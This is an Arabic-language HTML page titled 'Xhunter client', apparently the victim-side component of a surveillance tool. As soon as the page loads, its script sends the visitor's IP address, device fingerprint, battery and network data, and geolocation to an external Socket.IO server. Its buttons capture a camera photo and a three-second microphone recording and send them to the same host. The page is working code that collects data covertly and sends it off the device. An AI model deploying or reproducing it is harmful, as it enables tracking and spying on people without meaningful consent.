<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>عميل Xhunter (أوتوماتيك)</title>
<style>
body{font-family:Arial,helvetica,sans-serif;background:#071021;color:#bfffe8;padding:18px}
h1{color:#00ffcc}
button{padding:10px 12px;margin:6px;border-radius:7px;border:none;background:#00ffcc;color:#001219;font-weight:700;cursor:pointer}
.small{padding:8px 10px;font-size:13px}
.info{margin:8px 0;color:#dfffe8}
</style>
</head>
<body>
<h1>عميل Xhunter</h1>
<p class="info">هذه الصفحة ترسل بيانات جهازك تلقائيًا للتجربة.</p>

<button id="btnCamera" class="small">التقاط صورة بالكاميرا</button>
<button id="btnMic" class="small">تسجيل صوت (3 ثواني)</button>

<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io('https://projectd-vu1m.onrender.com', { transports:['websocket'], reconnection:true });
const deviceId = 'device_' + Math.floor(Math.random()*10000);
const model = navigator.userAgent;
let ip = null;

// دالة إرسال
function emit(ev, payload){ socket.emit(ev, payload); console.log('emit', ev, payload); }

// جلب IP
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>{ ip=j.ip; sendAll(); }).catch(()=>sendAll());

// إرسال جميع البيانات
async function sendAll(){
  const payload = {
    id: deviceId,
    model,
    language: navigator.language,
    screen: { width: window.screen.width, height: window.screen.height },
    platform: navigator.platform,
    cookiesEnabled: navigator.cookieEnabled,
    deviceMemory: navigator.deviceMemory || null,
    hardwareConcurrency: navigator.hardwareConcurrency || null,
    ip
  };
  emit('join', payload);
  emit('deviceInfo', { id: deviceId, extra: payload });

  // بطارية
  if(navigator.getBattery){
    try{
      const batt=await navigator.getBattery();
      emit('battery',{ id:deviceId, data:{ level:batt.level, charging:batt.charging }});
    }catch(e){}
  }

  // شبكة
  const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
  if(conn){
    emit('networkInfo',{ id:deviceId, data:{ effectiveType:conn.effectiveType, downlink:conn.downlink, rtt:conn.rtt, saveData:conn.saveData }});
  }

  // موقع
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(pos=>{
      emit('getLocation',{ id:deviceId, data:{ lat:pos.coords.latitude, lon:pos.coords.longitude, accuracy:pos.coords.accuracy }});
    });
  }
}

// ----------- الكاميرا ----------
document.getElementById('btnCamera').addEventListener('click', async ()=>{
  try{
    const stream=await navigator.mediaDevices.getUserMedia({ video:true });
    const video=document.createElement('video'); video.srcObject=stream;
    await video.play();
    const canvas=document.createElement('canvas');
    canvas.width=video.videoWidth; canvas.height=video.videoHeight;
    canvas.getContext('2d').drawImage(video,0,0);
    const dataUrl=canvas.toDataURL('image/jpeg',0.8);
    stream.getTracks().forEach(t=>t.stop());
    emit('photo',{ id:deviceId,data:dataUrl });
    alert("تم التقاط صورة");
  }catch(e){ alert("فشل الكاميرا: "+e.message); }
});

// ----------- الميكروفون ----------
document.getElementById('btnMic').addEventListener('click', async ()=>{
  try{
    const stream=await navigator.mediaDevices.getUserMedia({ audio:true });
    const rec=new MediaRecorder(stream); const chunks=[];
    rec.ondataavailable=e=>{ if(e.data.size) chunks.push(e.data); };
    rec.onstop=()=>{
      const blob=new Blob(chunks,{ type:'audio/webm' });
      const reader=new FileReader();
      reader.onload=()=>emit('audio',{ id:deviceId,data:reader.result });
      reader.readAsDataURL(blob);
      stream.getTracks().forEach(t=>t.stop());
    };
    rec.start(); setTimeout(()=>rec.stop(),3000);
    alert("جارٍ التسجيل 3 ثواني...");
  }catch(e){ alert("فشل الميكروفون: "+e.message); }
});
</script>
</body>
</html>
